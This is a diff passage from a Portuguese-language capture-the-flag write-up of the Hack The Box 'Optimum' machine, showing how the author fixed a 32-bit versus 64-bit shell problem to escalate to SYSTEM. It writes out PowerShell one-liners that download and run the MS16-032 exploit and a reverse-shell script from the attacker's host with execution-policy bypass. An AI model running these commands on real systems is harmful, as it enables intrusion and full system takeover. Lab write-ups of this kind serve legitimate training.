@@ -1431,3 +1431,26 @@ Primeira tentativa sem exito.. :/
 `IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.36:3001/ms16_032_intrd_mod.ps1');Invoke-MS16-032 "-NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.36:3001/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.36 -Port 3003"     `
 
 ![9.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-optimum/9.jpg)
+
+Enfim peguei reverse de SYSTEM!
+
+![10.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-optimum/10.jpg)
+
+O problema era que minha shell inicial era em 32bits e nao 64bits, por isso o exploit nao funcionava corretamente.
+
+Eu precisava de um POWERSHEL certo? Entao, da minha primeira reverse eu estava executando `> powershell -exec bypass .\Invoke-ReverseTcp.ps1` entao a shell continuava vindo em 32bits e nao os 64 conforme a gente precisava..
+
+Entao ajustei passando o PATH direto ficando assim..
+
+`C:\Users\kostas\Desktop>C:\windows\sysnative\windowspowershell\v1.0\powershell -exec bypass .\shell.ps1`
+
+E deppois ja com minha nova reverse shell em 64bits executei o seguinte..
+
+`PS C:\Users\kostas\Desktop>IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.36:3001/ms16_032_intrd_mod.ps1');Invoke-MS16-032 "-NoProfile -ExecutionPolicy Byp
+ass -Command IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.36:3001/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.36 -Port 3
+003" `
+
+pronto, finalmente SYSTEM!
+
+
+
